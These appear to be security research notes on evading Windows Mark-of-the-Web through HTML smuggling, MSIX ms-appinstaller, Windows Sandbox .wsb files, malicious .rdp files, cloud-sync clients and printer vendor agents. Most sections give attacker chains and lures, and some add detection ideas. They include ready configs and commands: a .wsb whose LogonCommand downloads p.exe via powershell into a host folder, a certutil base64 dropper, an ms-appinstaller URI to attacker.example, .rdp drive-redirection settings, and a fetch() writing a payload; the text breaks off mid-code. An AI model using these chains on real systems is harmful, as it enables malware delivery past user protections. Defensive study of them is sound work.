# MOTW Bypass Research Notes

Spitball notes on how attackers can deliver files to disk without a
`Zone.Identifier` ADS, with HTML smuggling as the common upstream delivery.

## The options (compact index)

1. **Container formats** — ISO, VHD/VHDX, 7-Zip <22, WinRAR/PeaZip/Bandizip quirks, CAB via `expand`, MSI, WIM/SquashFS/Zstd, nested archives, password-protected.
2. **Non-ADS filesystems** — FAT32/exFAT round-trip, SMB to non-NTFS, UDF, WSL `/mnt/c`, container volumes.
3. **Cloud-sync clients** — OneDrive, Dropbox, Google Drive, Box, iCloud, Nextcloud, Teams.
4. **LOLBins** — `curl.exe`, `certutil`, `bitsadmin`, some `Invoke-WebRequest` paths, `robocopy`/`xcopy` from UNC, `wsl -- curl`.
5. **Protocol handlers / IPC** — `search-ms:`, `ms-officecmd:`, `onenote:`, `mstsc:`, Electron-app schemes.
6. **WebDAV + Windows redirector** — `search-ms:` lures, redirector-as-writer, inconsistent MOTW.
7. **Application unpackers** — OneNote `.one`, Outlook MSG temp extraction, Office OLE `Package`, PDF embedded files, MHT.
8. **Post-write ADS stripping** — `Unblock-File`, `Remove-Item -Stream`, `type > copy`, Notepad Save-As, Sysinternals `streams.exe`.
9. **Policy weakening** — `Zones\3\1806`, `SaveZoneInformation`, Attachment Manager reg keys.
10. **Drag-and-drop / clipboard** — cross-browser D&D variance, File System Access API edges, Web Share Target.
11. **Trust-boundary confusion** — `.hta` via `mshta`, `.lnk` re-targeting, `.url` with UNC icons.
12. **Speculative** — AppX/MSIX sideload, Windows Sandbox `.wsb` shared folders, Hyper-V Enhanced Session clipboard, printer/scan-to-folder destinations, game/mod launchers.

---

## Deep dive — 12. Speculative

These feel under-researched. Expect at least a couple to yield something if
someone actually poked.

### AppX / MSIX sideload
- Install happens via `AppInstaller.exe` or the deployment service (`AppXSvc`), not the browser. Whatever the package drops into `%ProgramFiles%\WindowsApps\<PackageFullName>\` is written by a service, so no MOTW.
- The *package file* itself (`.msix`, `.appx`, `.appinstaller`) does carry MOTW when downloaded — but there's a history of `.appinstaller` files pointing at remote `.msix` URLs, and the *fetched-by-service* copy is MOTW-less. CVE-2021-43890 (Emotet/BazarLoader abuse) was exactly this pathway; Microsoft disabled the `ms-appinstaller` protocol handler, re-enabled it, disabled again in 2024. Still worth watching because the handler keeps coming back for dev convenience.
- Bundled-content angle: MSIX can include arbitrary files consumed by the installed app at runtime. Those inner files are never touched by zone logic.
- **Poke**: test what happens when a sideloaded MSIX uses `VFS\AppData` redirection to place files in user-visible paths. Those user-facing files — do they get MOTW? Likely no.

### Windows Sandbox `.wsb` shared folders
- `.wsb` is just XML; opening one spins a disposable VM. It supports `<MappedFolder>` entries.
- A malicious `.wsb` could map attacker-controlled content into the sandbox, run arbitrary logon commands, and *write files back to the host folder* from inside the sandbox.
- The writer from the host's perspective is `vmmem` / the virtualization stack, not the browser. MOTW almost certainly not applied, because the host sees these as VM-originated filesystem writes.
- Delivery: `.wsb` itself probably does carry MOTW on download, but double-click-to-open flow may not enforce a SmartScreen check the way `.exe` does. Needs testing.
- **Poke**: drop a file into a mapped folder from a sandbox logon command, check host-side ADS.

### Hyper-V Enhanced Session clipboard / drive redirection
- RDP-over-VMBus in Enhanced Session supports drive redirection and clipboard file transfer.
- Files dragged from guest to host (or copied via clipboard) land written by `rdpclip.exe` / virtualization stack.
- Not a drive-by primitive — requires the user already be in an ES session — but once inside, exfil/drop both bypass MOTW.
- Generalizes to RDP sessions too: files copied over RDP clipboard into the local machine are written by `rdpclip.exe`. Real and probably underused bypass — arguably belongs outside "speculative."

### Printer drivers / scan-to-folder
- Multifunction printers with scan-to-SMB or scan-to-email-to-folder write files via the spooler or a vendor agent.
- An attacker who can reach the printer's management interface (huge "if") can redirect scan output to attacker-chosen paths.
- More realistic: malicious PostScript / PCL jobs exploiting driver parsing, writing temp files as `spoolsv.exe`. Print Spooler has a rich CVE history here.
- Bypass is incidental — files written by `spoolsv.exe` don't carry MOTW because the spooler never considered zones.

### Game launchers / mod managers
- Steam (Workshop), Epic Games Launcher, GOG Galaxy, Vortex, MO2, Thunderstore, CurseForge, R2Modman — all download arbitrary third-party content via their own HTTP clients and write into game folders or `%AppData%`.
- None apply MOTW. Their threat model treats the content as trusted-by-subscription.
- Realistic abuse: malicious mod uploaded to a less-curated workshop, user subscribes, the launcher fetches and writes. For delivery via HTML smuggling, the smuggled page could trigger `steam://` protocol handler (`steam://install/<appid>`, `steam://subscribecollection/<id>`) which the Steam client will act on without strong prompts.
- Mod managers especially: Vortex and MO2 handle arbitrary archive formats, extract into the game directory, and don't propagate MOTW. Combines nicely with container-format tricks from category 1.
- **Poke**: `steam://` URIs from a smuggled HTML, see what prompts (if any) appear on a non-admin user.

### Bonus speculative
- **Node.js / `npx` cache**: `npm install` and `npx` fetch tarballs and execute lifecycle scripts. Writer is `node.exe`, no MOTW. Dev-box-only but devs are high-value targets.
- **Python `pip`** — same story.
- **`winget`** — MS's package manager. Installer downloads happen via service context; some manifests point at arbitrary URLs.
- **Browser built-in PDF viewer "Save"** — Chromium writes the re-serialized PDF via its own code path; has had tagging inconsistencies historically, worth re-testing.
- **Discord / Slack / Teams file attachments** viewed inline, then "Save As" — the client writes the file, not the browser.

---

## Deep dive — 3. Cloud-sync clients

Most underappreciated category relative to how exploitable it is.

### Why it's a bypass at all

MOTW exists to mark content that crossed an Internet trust boundary *at the
time of write*. Cloud-sync clients are signed, trusted local services. From
the OS's perspective, a file appearing in `%USERPROFILE%\OneDrive\...` was
written by `OneDrive.exe`, which is a local process with no "zone" context.
There's no API call that says "by the way, this byte stream came from the
internet." So no ADS gets attached.

Microsoft has not fixed this. They arguably *can't* cleanly — if OneDrive
tagged every synced file with MOTW, Office would break for legitimate shared
docs on every user. The trust model of cloud sync is "the collaboration
platform vouches for the content," which is exactly the thing attackers
exploit.

### Client-by-client behavior (verify on current builds)

- **OneDrive / SharePoint sync** — no MOTW. "Files On-Demand" makes it worse: files appear as placeholders, hydrate on access, hydration is a `cldflt.sys` operation, no tagging.
- **OneDrive Personal vs Business** — same underlying client, same behavior.
- **Google Drive for Desktop** — no MOTW. Uses `GoogleDriveFS.exe`, virtual drive letter. Same cloud-files API as OneDrive.
- **Dropbox** — no MOTW historically; also uses CLDFLT hydration now.
- **Box Drive** — no MOTW.
- **iCloud for Windows** — no MOTW. Also has `.icloud` placeholder files.
- **Nextcloud / ownCloud clients** — no MOTW. Self-hosted angle is interesting (attacker runs the "cloud").
- **Teams / OneDrive-Business via Teams file share** — Teams attachments go through SharePoint under the hood, so whatever's true for OneDrive is true here.
- **Slack** — Slack's desktop client doesn't do filesystem sync, but "Open in external app" / "Download" paths exist. Those writes are done by the Electron renderer and usually *do* get MOTW via Chromium's download stack. So Slack is less interesting than Teams for this.

### Attack shapes

**A. Shared-folder drop**
1. Attacker has a SharePoint / OneDrive-for-Business tenant (trial tenants are free and abundant) or compromises one.
2. Shares a folder with victim's email (or uses an "open-link" share that doesn't require account add, depending on tenant config).
3. Victim accepts / the folder auto-appears in their OneDrive tree.
4. Sync client writes payload locally. No MOTW.
5. HTML-smuggling angle: smuggled HTML just needs to get the victim to click "Add shortcut to My files" or similar; the rest is the sync client's job.

**B. SharePoint direct-link lure**
- SharePoint links (`*.sharepoint.com`) are on allowlists at many orgs because they're "Microsoft."
- `?download=1` on a SharePoint file URL triggers browser download (which *does* get MOTW), but "Open in desktop app" paths and "Sync" paths don't.
- Smuggled HTML can rewrite the lure to steer toward the sync path.

**C. `.url` file pointing at a cloud-sync trigger**
- `.url` file with `URL=https://tenant.sharepoint.com/...` opened from Explorer can be configured to trigger desktop-app open.
- `.url` itself is small, smuggles well, and the MOTW-bearing file is the `.url`, not the eventually-synced payload.

**D. Self-hosted Nextcloud as an "evil cloud"**
- Attacker runs Nextcloud, shares a folder, tricks victim into connecting their client.
- Now attacker has persistent, deniable, MOTW-free file delivery into the victim's home directory.
- Pairs nicely with supply-chain against small orgs where someone's personal Nextcloud is on the allowlist.

**E. "Files On-Demand" race**
- Placeholder hydrates only when accessed.
- If the hydration writes the real bytes *into the same inode* without invoking the attachment manager, there's no opportunity for MOTW even in principle.
- Architectural, not a bug.

### Delivery marrying HTML smuggling to cloud sync

The smuggled HTML's job becomes "get the victim to act on a sharing URL"
rather than "get bytes to disk itself." The smuggled JS can:

- Render a convincing "click to accept shared folder" UI that deep-links into the victim's OneDrive sharing acceptance flow.
- Use `ms-sharepoint:` / Office protocol handlers to trigger client-side actions.
- Stage a `.url` or `.lnk` to drop into a synced folder that *itself* is attacker-controlled, establishing a feedback loop.

The content delivery and the execution are decoupled: the HTML never carries
the payload, so wire-side inspection finds nothing interesting. The sync
client fetches from `*.sharepoint.com` over TLS, past most inspection.

### What would meaningfully detect it

At the write moment, the forensic signal is:
- Parent process of the file: `OneDrive.exe` / `GoogleDriveFS.exe` / `Dropbox.exe` / etc.
- Path: cloud-sync-managed root.
- No MOTW on a file that exhibits executable-like characteristics (PE header, script extension, archive-of-executable, etc.).
- Correlation with a recent sharing-acceptance flow — harder to get at, requires pulling OneDrive logs from `%LOCALAPPDATA%\Microsoft\OneDrive\logs\`.

The realistic detection story is behavioral, not MOTW-based. Once you know
the sync client is the writer, MOTW absence is expected, so its absence stops
being the signal. The signal becomes "suspicious *filetype* appearing in a
sync folder" — essentially a content-based rule against the sync root.

This is also why the overall MOTW detection strategy has a ceiling: as more
legitimate delivery moves through cloud-sync, "no MOTW" converges with
"normal," and you need a second axis (file type, path, process lineage, user
behavior) to keep precision up.

---

# Per-target deep dives

## 1. AppX / MSIX sideload

### How install actually happens

Three file types in this family, each behaving differently:

- **`.msix` / `.appx`** — self-contained package (zip + AppxManifest.xml + signature). Double-click opens `AppInstaller.exe` UI → user clicks Install → `AppXSvc` deploys it under `%ProgramFiles%\WindowsApps\<PackageFullName>\` and registers it.
- **`.msixbundle` / `.appxbundle`** — wrapper containing multiple architecture-specific MSIX.
- **`.appinstaller`** — XML *manifest* pointing at a remote `.msix` URL, with optional auto-update config. This is the interesting one.

### Process lineage (who writes what)

1. Browser downloads `.msix` or `.appinstaller` → file lands in `Downloads\` **with MOTW**. This part is standard.
2. User double-clicks → Explorer invokes the registered handler for the extension.
3. For `.appinstaller`: `AppInstaller.exe` parses the XML, fetches the referenced `.msix` from the URL **itself**. That fetched payload is written into a cache path (`%LOCALAPPDATA%\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\LocalCache\...`) by `AppInstaller.exe`. **No MOTW on that cached copy** — the writer is a local signed MS process, not the browser.
4. `AppXSvc` (running as SYSTEM) extracts the MSIX contents into `%ProgramFiles%\WindowsApps\<PackageFullName>\`. **No MOTW on any of those files** — they're written by a service.

The user-visible, executable-ready files produced by install never carry
MOTW. This is by design: MSIX's security model is "the package signature is
the trust anchor, MOTW is irrelevant."

### The `ms-appinstaller:` protocol — the actual bypass primitive

`ms-appinstaller:` is a URI handler that lets a web page trigger install of
an `.appinstaller` URL **without downloading anything to the browser's
download folder first**.

```
ms-appinstaller:?source=https://attacker.example/payload.appinstaller
```

When this fires:
- `AppInstaller.exe` fetches the `.appinstaller` and the referenced `.msix` directly.
- No file in `Downloads\` at all, so no MOTW/SmartScreen check on a downloaded file.
- SmartScreen *is* invoked on the package itself, but via its own path that only checks certificate reputation — not URL reputation the way browser-download SmartScreen does.
- Prior to the 2021 CVE, the install UI presented the package's stated publisher name prominently, which was spoofable.

### History (matters for understanding current state)

- **2021** — Emotet/BazarLoader campaigns used `ms-appinstaller:` + spoofed publisher names. CVE-2021-43890.
- **Dec 2021** — Microsoft disabled `ms-appinstaller:` protocol handler. Clients needed to download the `.appinstaller` file locally and double-click.
- **2022** — Microsoft re-enabled it with "improvements" (clearer UI, better publisher surfacing).
- **2023** — abuse resumed immediately. Multiple financially-motivated groups (Storm-0569, Sangria Tempest, Storm-1113, Storm-1674) ran campaigns dropping ransomware loaders via `ms-appinstaller:`. Fake Teams/Zoom/Adobe lures.
- **Feb 2024** — MS disabled the protocol handler again by default (`EnableMSAppInstallerProtocol` policy defaults to off). Still re-enableable by admins, and often is on dev boxes.
- **2025-2026** — sporadic campaigns against orgs that re-enabled it or against Windows Server where defaults differ. The handler keeps coming back because legitimate LOB app distribution uses it.

### What's still viable in 2026

**A. Direct `.appinstaller` / `.msix` file delivery (no protocol handler)**
- The `.appinstaller` / `.msix` file itself carries MOTW when downloaded.
- But the *cached intermediate `.msix`* fetched by `AppInstaller.exe` from the `.appinstaller` URL does not.
- And the extracted app files in `WindowsApps\` do not.
- So a MOTW detector pointed at `Downloads\` catches the `.appinstaller` but misses what actually runs.
- Signature requirement matters: MSIX must be signed by a cert in a trusted root. Attackers use abused code-signing certs — there's a lively market. That's a real barrier relative to unsigned PE droppers, but not prohibitive.

**B. Protocol handler (where enabled)**
- Still viable on orgs that re-enabled `ms-appinstaller:` for legit app distribution.
- Smuggled HTML → `window.location = 'ms-appinstaller:?source=...'` → install flow fires with only a single prompt.
- Nothing lands in `Downloads\` at all. MOTW-based detection sees zero signal.

### HTML-smuggling chain

Smuggled HTML here doesn't need to "smuggle" the payload — the payload is
hosted at the attacker's URL for `AppInstaller.exe` to fetch directly. What
the HTML does:

1. Present a convincing "install this legitimate app" UI.
2. On user click, navigate to `ms-appinstaller:?source=https://...`.
3. Fall back to a direct `.appinstaller` file download if the protocol handler is disabled, with instructions to "double-click to install."

Arguably *nicer* than classic HTML smuggling because the wire-side content is
just an XML manifest + signed MSIX, no encrypted blob to look suspicious.

### What inside the package can be abused

- **`StartupTasks`** extension — app auto-runs a task at login with no user interaction after install.
- **Package file associations** — app can register as handler for common extensions (`.pdf`, `.txt`) and be invoked when user opens such files.
- **Protocol activations** — register custom URI scheme, then a second smuggled page later can invoke the installed app without MOTW-bearing files.
- **`desktop6:Extension` category="windows.fullTrustProcess"`** — declares a full-trust Win32 EXE inside the package. When invoked, it runs as the user with no sandbox. This is what turns MSIX from "sandboxed UWP thing" into "arbitrary Win32 payload delivery."

### Uncertainties worth testing on a current build

1. On Win11 24H2 / 25H2 with defaults — is `ms-appinstaller:` handler truly off? Check `HKLM\SOFTWARE\Policies\Microsoft\Windows\Appx\EnableMSAppInstallerProtocol`.
2. Does double-clicking a downloaded `.appinstaller` (which has MOTW) trigger any SmartScreen-like check beyond package-signature validation? Suspect no.
3. Does `VFS\AppData\Roaming\...\payload.exe` inside an MSIX end up in `%APPDATA%\...\payload.exe` after install? If yes, that's an arbitrary-file-drop primitive that bypasses MOTW for files in user-visible paths.
4. What does `winget install --manifest` do when pointed at an attacker-crafted local manifest? `winget` is also `AppInstaller.exe`-family.
5. Does `Add-AppxPackage -Path <UNC>` leave any ADS anywhere in the flow? UNC source might matter.

### Detection angle

- Watching `Downloads\` for MOTW-less files misses this entirely.
- Watching `%ProgramFiles%\WindowsApps\` for new package installs is the real signal, but requires elevation to read.
- `%LOCALAPPDATA%\Packages\Microsoft.DesktopAppInstaller_*\LocalCache\` holds the intermediate fetched `.msix` — interesting forensic artifact, user-readable.
- Appx deployment event log: `Microsoft-Windows-AppXDeploymentServer/Operational` — authoritative record of every install, timestamp, source URL, publisher. Probably the actual answer: trust the event log over the filesystem for this category.

## 2. Windows Sandbox `.wsb` shared folders

### What Windows Sandbox is

Lightweight Hyper-V VM built into Win10/11 Pro/Enterprise, disposable
(resets on close), launched via `WindowsSandbox.exe`. Config goes in `.wsb`
XML files. **Not available on Home**, and the feature must be explicitly
enabled (`Windows Features` → checkbox → reboot). Target universe: dev
boxes, malware analysts, security researchers, IT admins.

### `.wsb` file format

Plain XML. Attack-relevant fields:

```xml
<Configuration>
  <Networking>Default</Networking>
  <MappedFolders>
    <MappedFolder>
      <HostFolder>C:\Users\victim\Downloads</HostFolder>
      <SandboxFolder>C:\Drop</SandboxFolder>
      <ReadOnly>false</ReadOnly>
    </MappedFolder>
  </MappedFolders>
  <LogonCommand>
    <Command>cmd.exe /c powershell -c "iwr http://a/p.exe -OutFile C:\Drop\p.exe"</Command>
  </LogonCommand>
  <ClipboardRedirection>Enable</ClipboardRedirection>
</Configuration>
```

Any user-writable path can be mapped. `<ReadOnly>false</ReadOnly>` +
`<LogonCommand>` is the whole primitive: sandbox fetches payload over its
own network stack, writes into the mapped folder, file materializes on host.

### Process lineage and MOTW

From the host kernel's perspective, files appearing in a mapped-folder path
are produced by the VMBus filesystem redirector, not by `curl`/`iwr`/a
browser. The writing process on host is `WindowsSandboxServer.exe` /
`vmmem`. Zone information is only attached by code paths that know about
zones — Attachment Manager hooks invoked by browsers/Outlook/etc. The VMBus
redirector has no such hook. **Hypothesis: files mapped-out from sandbox
arrive with no `Zone.Identifier` ADS.** Needs confirmation on a current
build, but architecturally there's no plausible place it would get applied.

### The `.wsb` file itself

This is the weak point in the attacker's chain because:

- `.wsb` is downloaded via the browser → the file in `Downloads\` does carry MOTW.
- However, `.wsb` is not on Attachment Manager's "high-risk" extension list, so there's no `Open File - Security Warning` prompt on double-click (unlike `.exe` / `.msi`).
- SmartScreen doesn't flag `.wsb` — unsigned executable reputation checks don't apply to an XML config file.
- The file association dispatches to `WindowsSandboxClient.exe`, which trusts the XML without user-facing confirmation about what paths get mapped.

UX for the victim: double-click `.wsb` → Sandbox window appears → something
happens inside → window closes. No explicit "this will write to your
Downloads folder" prompt.

### HTML-smuggling chain

1. Smuggled HTML encodes a tiny `.wsb` + saves via `a.download`. `.wsb` files are ~1 KB; trivial to smuggle.
2. Lure: "test our tool in a safe sandbox — double-click to launch."
3. User runs it. `LogonCommand` fetches payload inside sandbox, writes to `<MappedFolder>` pointing at host Downloads.
4. Payload appears on host. No MOTW.
5. Optional: `LogonCommand` also drops a `.lnk` in the same mapped folder pointing at the payload, or renames the payload to look like a document.

The `.wsb` never needs to contain the payload bytes — network fetch happens
from inside the VM, a separate egress surface from the browser.

### Fully-offline variant

If network egress is restricted, payload can be embedded as base64 inside
`<LogonCommand>`:

```xml
<LogonCommand>
  <Command>cmd.exe /c echo BASE64... | certutil -decode - C:\Drop\p.exe</Command>
</LogonCommand>
```

Sandbox needs no network; smuggled HTML delivers the whole thing in the
`.wsb`.

### Sandbox-as-MOTW-launderer

Sandbox can be used to *strip* MOTW from files already on host. Map
Downloads read-write, `LogonCommand` runs:

```cmd
type C:\Drop\tagged.exe > C:\Drop\clean.exe
del C:\Drop\tagged.exe
```

The `type >` redirect drops ADS. A previously-MOTW-tagged file becomes
untagged on host, without the attacker needing any host-side code execution
other than opening the `.wsb`.

### Limiting factors

- **Feature must be enabled**: `Containers-DisposableClientVM` optional feature. Off by default; enabling requires admin + reboot.
- **Edition gating**: Home is out. Pro/Enterprise only.
- **Enterprise GPO**: orgs that ship hardened images often disable Sandbox via `HKLM\SOFTWARE\Policies\Microsoft\Windows\Sandbox\AllowWindowsSandbox = 0`.
- **Hypervisor requirements**: VT-x/AMD-V + SLAT. Real on any reasonable endpoint.

Targeted-campaign primitive, not commodity. Against a malware analyst, IT
admin, or developer with Sandbox enabled, clean. Against a normal corporate
user, non-starter.

### Novel / less-obvious angles

1. **UNC in `<HostFolder>`**: can the mapped host folder be a UNC path (`\\attacker-server\share`)? Unlikely to work cleanly but worth a test.
2. **Multiple mappings for path-confusion**: map different host paths to the same sandbox path with different `ReadOnly` values; see which wins. Parser bugs sometimes live here.
3. **Persistent artifacts from ephemeral sandbox**: instance is disposed, but files dropped via mapped folders persist. Deniability — no process on host ever "ran" the attacker code.
4. **Clipboard redirection as an exfil/drop channel**: `ClipboardRedirection=Enable` lets sandbox copy to host clipboard.
5. **Chained execution**: `.wsb` + `LogonCommand` could invoke another primitive — register a protocol handler inside sandbox, map out a `.url` that when double-clicked on host triggers something pre-staged.

### Uncertainties to test

1. **Does MOTW get applied to mapped-folder writes?** Primary hypothesis. Create file in sandbox, inspect `:Zone.Identifier` on host.
2. **What's the host-side process in ETW / Sysmon FileCreate events?** `WindowsSandboxServer.exe`? `vmmem`? Kernel-only?
3. **Is `.wsb` double-click gated by any warning?** Test on Win11 25H2.
4. **What privileges does `<LogonCommand>` run with?** Believe: `WDAGUtilityAccount`, standard user inside sandbox.
5. **Does `<HostFolder>` support environment variables?** `%USERPROFILE%\Downloads` would make attacks portable across victims. Test which fields support expansion.

### Detection angle

- Parse any `.wsb` on disk, flag those where `<ReadOnly>` is false AND `<LogonCommand>` exists AND `<Networking>` is not `Disable`.
- Host-side FileCreate events from sandbox-server process.
- Event log: `Microsoft-Windows-Hyper-V-Worker-Admin` and related channels for sandbox VM lifecycle.
- Feature being enabled at all on a non-developer machine is itself a weak signal.

### Realism summary

Less proven-in-the-wild than MSIX, but architecturally clean. Best treated
as "known-viable when target fits the profile," not commodity. The
MOTW-laundering use case (clean an existing tagged file without code
execution on host) may be more interesting than fresh-drop; it converts a
MOTW-aware defense into a speedbump requiring only one user double-click.

## 3. Hyper-V Enhanced Session / RDP clipboard & drive redirection

### The primitive in one sentence

Files transferred *into* the host machine through RDP drive redirection or
RDP clipboard file-copy are written by `rdpclip.exe` / `TSClient`
filesystem redirector — neither of which applies MOTW.

### The relevant transports

Three closely related technologies share the abuse pattern:

1. **Classic RDP (mstsc.exe → remote host)** — local drives exposed as `\\tsclient\C`; clipboard shared; files can be copied either direction.
2. **Hyper-V Enhanced Session Mode (ESM)** — same RDP-over-VMBus protocol between Hyper-V host and guest VM.
3. **Windows Sandbox** — Enhanced Session under the hood. Its clipboard redirection is the same mechanism.

Each uses Terminal Services redirector machinery; host-side writer for
incoming files is `rdpclip.exe` (clipboard) or the redirector file-system
driver (drive sharing).

### Process lineage on host

- **Clipboard path**: `rdpclip.exe` receives clipboard format `CF_HDROP` or `FileContents`/`FileGroupDescriptor`. Writes temp files into `%TEMP%\RDPClip\<guid>\...`, then paste-target Explorer copies to the final path via normal shell IO. **The initial write is by `rdpclip.exe`**, no zone hook.
- **Drive redirection path**: `\\tsclient\C\...` goes through RDP virtual channel and the RDPDR redirector kernel driver. Target-side writer is `explorer.exe` copying through the redirector. MOTW depends on whether Explorer's copy engine treats `\\tsclient\*` as "Internet zone" — it does *not*. `\\tsclient` is treated as local/intranet, same as any UNC.

Either way: file lands on host without `Zone.Identifier`.

### Why this is more exploitable than it looks

**A. Malicious RDP config file (`.rdp`)**
- `.rdp` files are plain text key=value pairs.
- Attacker-crafted `.rdp` can specify **`drivestoredirect:s:*`** (redirect all local drives) and **`redirectclipboard:i:1`**.
- Plus `full address:s:attacker-rdp.example.com` and `remoteapplicationmode:i:1`, `remoteapplicationprogram:s:...`.
- User double-clicks → `mstsc.exe` connects to attacker's RDP server → attacker enumerates exposed local drives and **writes files into them**.
- Used in phishing in 2024–2025: "Midnight Blizzard" / APT29 `.rdp` campaign. Microsoft and CERT-UA documented. Most commentary focused on *exfil* via exposed local drives. The *write-in* direction is the MOTW-bypass angle and got less attention.

Realistic shape: smuggled HTML drops `.rdp` → user opens → remote attacker
RDP server silently writes files into `\\tsclient\C\Users\victim\Downloads\`
via the redirector. Files arrive **MOTW-less**, because the writer is the
RDP redirector, not a browser.

**B. RemoteApp as persistence-and-drop primitive**
- `.rdp` with `remoteapplicationmode:i:1` + `remoteapplicationprogram:s:...` launches a single remote application as if native.
- Combined with drive redirection, remote app has full read/write access to mapped local paths under user's creds.
- Visually less alarming than a full RDP session.

**C. Hyper-V ESM clipboard from guest**
- Less phishable (requires ESM session to attacker-controlled VM), but relevant in:
  - Malware analysis (analyst copies sample *out* of VM — writer is `rdpclip.exe`, no MOTW).
  - Shared-lab environments.
  - **WSL2's `wslg`** uses similar RDP-based plumbing — worth investigating whether file copy from WSL2 to Windows via clipboard inherits MOTW. Affects a much larger population than ESM.

### HTML-smuggling chain

```
[phishing] → smuggled HTML → .rdp file saved via a.download
           → user double-clicks .rdp
           → mstsc.exe connects to attacker-rdp.example.com:3389
           → attacker RDP server enumerates \\tsclient\C
           → attacker script pushes payload into victim's Downloads
           → file on host has NO MOTW (rdpclip/redirector writer)
           → separately, attacker can also exfil arbitrary files from \\tsclient
```

One file, one click, attacker gets both exfil and deployment in one
primitive.

### What gates this in practice

- **GPO `fDisableCdm`** (disable drive redirection): many enterprise environments set this. When set, `\\tsclient\*` unavailable → no file write-in.
- **GPO `fDisableClip`** (disable clipboard redirection): blocks the clipboard-copy variant.
- **Attachment Manager on `.rdp`**: `.rdp` is on the moderate-risk list; double-click a downloaded `.rdp` with MOTW produces a "Publisher could not be verified" dialog. But the dialog is the same one users click through a hundred times, and signed `.rdp` files skip it.
- **Signed `.rdp`** via `rdpsign.exe` — attacker can self-sign with any code-signing cert. Removes warning.

### Novel / under-explored angles

1. **MOTW-laundering via local RDP loopback**: connect `mstsc.exe` to `127.0.0.2:3389` where attacker ran a tiny RDP server. Clipboard round-trip through loopback RDP strips MOTW.
2. **ESM + Windows Sandbox overlap**: if sandbox MappedFolder writes *do* get MOTW for some reason, the clipboard path in sandbox is an ESM clipboard path and inherits #3's properties.
3. **Drive redirection to specific folder**: `drivestoredirect:s:C:\Users\victim\Downloads;` supports subset redirection — minimizes user-perceived exposure.
4. **`remoteapplicationcmdline` argument injection**: parameters passed to remote program controlled by `.rdp` file.
5. **`prompt for credentials:i:0` + cached creds**: more seamless; user doesn't realize anything "remote" happened.

### Uncertainties to test

1. **On current Win11, does a file written via `\\tsclient` by an attacker-side script land with `Zone.Identifier`?** Gut says no.
2. **`rdpclip.exe` temp paths**: exact path, retention, whether those files ever get MOTW.
3. **WSL2 / WSLg file copy via clipboard**: does copying from a Linux app in WSLg to a Windows folder via clipboard produce MOTW?
4. **Signed `.rdp` behavior**: does `rdpsign.exe`-signed `.rdp` with trust-anchored cert skip all prompts on double-click from Downloads?
5. **Attachment Manager specifics**: confirm `.rdp` extension's risk classification and exact prompt behavior.

### Detection angle

- File creation by `rdpclip.exe` outside its normal temp paths = strong signal.
- File creation in user paths where parent/writer is TS RDPDR redirector.
- `.rdp` files in Downloads with `drivestoredirect` non-empty and `full address` pointing outside enterprise RDP gateway.
- Event log: `Microsoft-Windows-TerminalServices-ClientActiveXCore/Microsoft-RDP-Client/Operational` for mstsc connection events.
- RDP outbound connections to unfamiliar destinations — especially non-3389 ports (443 or alt ports common in attacks).

### Realism summary

`.rdp`-file phishing with drive redirection is **proven and active**. The
MOTW-bypass angle is secondary to the exfil angle in current attacker
playbooks but is a natural extension. Probably the *most realistic* of the
"speculative" targets — should be upgraded out of "speculative."

ESM-specific and WSLg-specific variants are genuinely speculative and
worth lab testing.

## 4. Printer drivers / scan-to-folder

### Two distinct primitives under one label

The "printer stuff" category fractures into three different bypass stories
with very different exploitability:

1. **Scan-to-folder / scan-to-SMB** — MFP writes scanned files to a Windows share.
2. **Print spooler as writer** — `spoolsv.exe` or driver-code writing files during job processing.
3. **Vendor print/scan agents** — installed tray apps / services from HP, Canon, Epson, Brother, Lexmark, Xerox, Ricoh. The most interesting one for HTML-smuggling chaining.

### A. Scan-to-folder / scan-to-SMB

**Normal operation**: MFP on the network scans a doc → delivers over SMB to
`\\server\share\scan-output\...`. Writer on Windows side is `System` (via
`lanmanserver`/`srv2.sys`). SMB file write does **not** invoke Attachment
Manager, so no MOTW.

**Why this matters**: the attacker doesn't need anything fancy to produce a
MOTW-less file on an SMB share. Any SMB write from anywhere lands without
MOTW. Explorer copying that file to a local folder *may* add MOTW if the
source path is Internet zone, but `\\tsclient` / `\\host\share` are
Intranet → no tag. SMB round-trip is a cheap MOTW-launderer.

**HTML-smuggling relevance**: poor. Attacker doesn't usually control the
org's printer. Chains possible but not "printer"-specific — just generic
SMB abuse (category 2).

**Conclusion**: scan-to-folder per se is not an HTML-smuggling primitive.
It's just "SMB writes don't carry MOTW."

### B. Print spooler as writer

**Normal operation**: `spoolsv.exe` processes print jobs. Writes spool
files (`%WINDIR%\System32\spool\PRINTERS\*.SPL`). Service-owned, not
user-facing, not a MOTW target.

**Interesting cases**:
- **Microsoft Print to PDF** pseudo-printer — writes PDF to user-chosen path. Writer is Print Spooler job context. Resulting PDF has **no MOTW**. Has to be user-initiated via file dialog, so not silent.
- **PostScript / PCL driver bugs** — malicious print job data exploiting driver parsing → code execution as `spoolsv.exe` (SYSTEM). PrintNightmare-family. Once SYSTEM, MOTW is irrelevant. Not a *novel* MOTW primitive.
- **"Print to file"** — PRN output files are spooler-written, no MOTW.

**HTML-smuggling relevance**: `window.print()` triggers print dialog, but
modern browsers require user confirmation for both print and save dialogs.
Not a silent primitive.

**Verdict**: useful with existing foothold; not useful as drive-by HTML primitive.

### C. Vendor print/scan agents — the real one

Every major vendor installs a user-mode agent or service. Partial list:

- **HP Smart / HP Support Solutions Framework** — background service, local HTTP endpoint historically on `127.0.0.1:60001` and similar.
- **Canon MF Toolbox / IJ Network Tool** — local listener for device discovery.
- **Epson Scan / Epson Software Updater** — scheduled update fetcher, local service.
- **Brother ControlCenter / iPrint&Scan** — tray app with IPC surface.
- **Lexmark Printer Home / Scan Center** — service + HTTP local endpoint.
- **Xerox Smart Start / Easy Printer Manager** — similar shape.
- **Ricoh @Remote Connector** — service syncing with Ricoh cloud.

Common properties that matter for MOTW bypass:

1. **Local HTTP / IPC servers** on loopback. Many bind to high ports on `127.0.0.1` or `0.0.0.0`. Some found with no authentication for local-origin requests.
2. **File write capability** as part of normal operation (staging scan output, caching received faxes, downloading driver updates).
3. **Custom URI protocol handlers** registered system-wide: `hp://`, `epson-scan://`, `canon-ijscan://`, `brother-ij://`.
4. **Run as the logged-on user or as SYSTEM** — files they write land with normal user permissions and no MOTW.
5. **Signed by the vendor** — process reputation/EDR rules treat them as trusted.
6. **Long CVE history** — rarely the vendor's main security focus.

### The plausible HTML-smuggling chain

```
smuggled HTML → fetch('http://127.0.0.1:<vendor_port>/api/scan/output?path=C:\Users\victim\Downloads\p.exe',
                      { method: 'POST', body: decrypted_payload })
